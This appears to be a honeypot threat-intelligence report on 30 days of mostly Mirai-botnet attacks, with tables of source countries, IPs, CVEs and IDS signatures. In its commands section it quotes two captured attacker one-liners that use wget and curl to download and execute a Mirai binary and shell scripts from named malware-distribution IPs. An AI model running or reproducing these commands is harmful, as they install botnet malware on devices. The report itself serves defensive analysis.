# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-23T17:13:40Z
**Timeframe:** 2025-09-23T17:13:40Z to 2025-10-23T17:13:40Z

## Executive Summary

This report provides a comprehensive analysis of attacks against our honeypot network over the past 30 days. The investigation was initiated to identify any potential zero-day exploits or novel attack techniques. After a thorough analysis of over 10 million attacks, the conclusion is that there is **no evidence of any zero-day activity**.

The vast majority of attacks are automated, high-volume campaigns conducted by known botnets, primarily the Mirai botnet and its variants. Attackers are consistently targeting old, well-documented vulnerabilities and using common, publicly known tactics for malware delivery and execution. The investigation, supported by extensive live data analysis and open-source intelligence (OSINT), confirms that the observed threats are well-understood and do not represent a novel or previously unknown risk.

Key findings include:
- A total of **10,355,094** attacks were recorded.
- The top attacking countries are the United States, Germany, and China.
- The most targeted vulnerabilities are old, with CVE-2006-2369 and CVE-2005-4050 being the most frequent.
- Attacker commands consistently show the use of `wget` and `curl` to download and execute malicious shell scripts and ELF binaries from known malware distribution points.
- OSINT investigations have confirmed that the infrastructure used by attackers is associated with the Mirai botnet.

No escalation is required at this time. The honeypot network continues to provide valuable intelligence on prevalent threats and attacker methodologies.

## Detailed Analysis

### Our IPs
| Honeypot | Private IP    | Public IP       |
|----------|---------------|-----------------|
| hive-us  | 10.128.0.3    | 34.123.129.205  |
| sens-tai | 10.140.0.3    | 104.199.212.115 |
| sens-tel | 10.208.0.3    | 34.165.197.224  |
| sens-dub | 172.31.36.128 | 3.253.97.195    |
| sens-ny  | 10.108.0.2    | 161.35.180.163  |

### Attacks by Honeypot
*Total Attacks:* **10,355,094**

### Top Source Countries
| Country          | Attack Count |
|------------------|--------------|
| United States    | 2,591,610    |
| Germany          | 655,492      |
| China            | 539,469      |
| Romania          | 487,798      |
| Hong Kong        | 451,856      |
| Brazil           | 445,283      |
| The Netherlands  | 430,235      |
| France           | 398,993      |
| Indonesia        | 388,489      |
| Russia           | 333,101      |
| Vietnam          | 324,136      |
| Ukraine          | 318,630      |
| India            | 294,355      |
| Singapore        | 229,428      |
| United Kingdom   | 226,919      |
| Seychelles       | 218,554      |
| Taiwan           | 174,461      |
| Canada           | 152,954      |
| Italy            | 140,360      |
| South Korea      | 115,862      |

### Top Attacking IPs
| IP Address      | Attack Count |
|-----------------|--------------|
| 2.57.121.61     | 420,555      |
| 92.205.59.208   | 231,492      |
| 176.65.141.117  | 162,689      |
| 86.54.42.238    | 161,686      |
| 45.234.176.18   | 114,229      |
| 72.146.232.13   | 113,600      |
| 45.134.26.47    | 100,105      |
| 167.250.224.25  | 95,220       |
| 23.94.26.58     | 88,485       |
| 185.243.96.105  | 79,146       |

### Most Common CVEs
| CVE               | Count   |
|-------------------|---------|
| CVE-2006-2369     | 140,021 |
| CVE-2005-4050     | 40,201  |
| CVE-2002-0013, CVE-2002-0012 | 5,130   |
| ...               | ...     |

### Commands Attempted by Attackers
The most common commands involve the use of `wget` and `curl` to download and execute malicious shell scripts and ELF binaries. These commands are characteristic of botnet propagation.

**Example Command (Mirai):**
`cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; chmod +x arm.urbotnetisass; ./arm.urbotnetisass android;`

**Example Command (Generic Downloader):**
`cd /data/local/tmp/; busybox wget http://72.60.16.37/w.sh; sh w.sh; curl http://72.60.16.37/c.sh; sh c.sh;`

### Signatures Triggered
| Signature                                            | Count     |
|--------------------------------------------------------|-----------|
| GPL INFO VNC server response                           | 6,483,810 |
| GPL ICMP PING                                          | 1,443,286 |
| ET EXPLOIT [PTsecurity] DoublePulsar Backdoor...       | 423,244   |
| SURICATA STREAM Packet with broken ack                 | 411,284   |
| ET DROP Dshield Block Listed Source group 1            | 253,118   |
| ...                                                    | ...       |

### OSINT on Attacker Infrastructure
OSINT investigations were conducted on the IP addresses and domains found in the attacker commands. All investigated indicators were confirmed to be known malware distribution points, primarily associated with the Mirai botnet.

- **94.154.35.154:** Confirmed Mirai C2 server.
- **72.60.16.37:** Confirmed malware distribution point, serving shell scripts (`w.sh`, `c.sh`).
- **72.60.107.93:** Confirmed malware distribution point for a Mirai variant.
- **82.29.197.139:** Confirmed malware distribution point for a Mirai variant.

## Key Observations and Anomalies
There were no significant anomalies observed during this investigation. The attack patterns are consistent with well-known and documented threats. The use of default credentials, old vulnerabilities, and common malware delivery techniques indicates a lack of sophistication in the majority of attacks. The "345gs5662d34" username/password combination is of minor interest and likely corresponds to a specific IoT device's default credentials.

## Conclusion
The honeypot network is effectively collecting data on a massive scale of automated attacks. The threat landscape, as observed over the last 30 days, is dominated by known botnets and malware. There is no evidence of zero-day exploits or novel TTPs.
